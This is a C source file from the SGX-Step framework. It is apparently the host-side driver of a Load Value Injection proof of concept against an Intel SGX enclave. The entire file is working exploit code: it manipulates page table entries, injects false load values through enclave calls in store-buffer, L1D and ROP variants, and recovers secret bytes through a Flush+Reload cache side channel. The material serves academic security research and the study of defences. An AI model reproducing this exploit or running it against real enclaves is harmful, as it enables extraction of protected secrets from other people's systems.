/*
 *  This file is part of the SGX-Step enclave execution control framework.
 *
 *  SGX-Step is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  SGX-Step is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with SGX-Step. If not, see <http://www.gnu.org/licenses/>.
 */

#include <sgx_urts.h>
#include <signal.h>
#include <sys/mman.h>

#include "Enclave/encl_u.h"
#include "cacheutils.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"

#define VICTIM_VAL 'B'
#define PRINT_HEX 0
#define DEBUG 0
#define OFFSET 20

/* XXX select attack scenario below */
#define LVI_SB 0
#define LVI_L1D 0
#define LVI_SB_ROP 1

char __attribute__((aligned(0x1000))) oracle[256 * 4096];
char __attribute__((aligned(0x1000))) user_page[4096];
void *enclave_page_a = NULL, *enclave_page_b = NULL;
char *user_pt = user_page;
uint64_t *pte_a = NULL, *pte_b = NULL;
uint64_t pte_b_valid = 0;

int offset = 0, printed = 0;
uint64_t enclave_base = 0;

void reconstruct_secret() {
    /* Reconstruct secret */
    for (int i = 1; i < 256; i++) {
        if (flush_reload((char *)oracle + 4096 * i)) {
            if (i != VICTIM_VAL) {
#if PRINT_HEX
                fprintf(stdout, "%02x @%x ", (char)i & 0xff, offset);
#else
                fprintf(stdout, "%c ", (char)i & 0xff);
#endif
                fflush(stdout);
            }
        }
    }
}

void fault_handler(int signal) {
    reconstruct_secret();

#if DEBUG
    info("#PF %d: erip %p", offset, edbgrd_erip() - (uint64_t)enclave_base);
#endif

    /* allow enclave to finish */
    *pte_b = pte_b_valid;
}

int main(int argc, char **argv) {
    sgx_launch_token_t token = {0};
    int updated = 0, rv;
    sgx_enclave_id_t eid = 0;

    /* Calculate Flush+Reload threshold */
    CACHE_MISS = detect_flush_reload_threshold();
    fprintf(stderr, "Flush+Reload Threshold: %zu\n", CACHE_MISS);
    memset(user_page, 'X', 4096);
    memset(oracle, 0, 4096 * 256);
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));

    /* Create enclave environment */
    info("Creating enclave...");
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1, &token,
                                  &updated, &eid, NULL));
    print_enclave_info();
    enclave_base = (uint64_t)get_enclave_base();
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);

    /* Setup page table mappings */
    info("oracle at %p", oracle);
    info("user_page at %p", user_pt);

    register_symbols("./Enclave/encl.so");
    enclave_page_a = get_symbol_offset("page_a") + get_enclave_base();
    info("enclave_page_a at %p w PTE", enclave_page_a);
    pte_a = remap_page_table_level(enclave_page_a, PTE);
    print_pte(pte_a);

    enclave_page_b = get_symbol_offset("page_b") + get_enclave_base();
    info("enclave_page_b at %p w PTE", enclave_page_b);
    pte_b = remap_page_table_level(enclave_page_b, PTE);
    print_pte(pte_b);
    pte_b_valid = *pte_b;

#if LVI_SB_ROP
    SGX_ASSERT(ecall_init_stack(eid));
#endif

    /* Inject false load values */
    mfence();
    while (1) {
        // for (offset=0; offset < 4096; offset++)
        {
            for (int i = 0; i < 256; i++) flush(oracle + 4096 * i);

#if LVI_SB
            *pte_b = MARK_SUPERVISOR(*pte_b);
            SGX_ASSERT(
                ecall_lvi_store_user(eid, (void *)user_pt + OFFSET, oracle));
#elif LVI_L1D
            *pte_b = *pte_a;
            SGX_ASSERT(ecall_lvi_remap_l1d(eid, oracle));
#elif LVI_SB_ROP
            *pte_b = MARK_SUPERVISOR(*pte_b);
            SGX_ASSERT(
                ecall_lvi_sb_rop(eid, &rv, (void *)user_pt + OFFSET, oracle));
#endif
        }
    }

    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("all is well; exiting..");
    return 0;
}
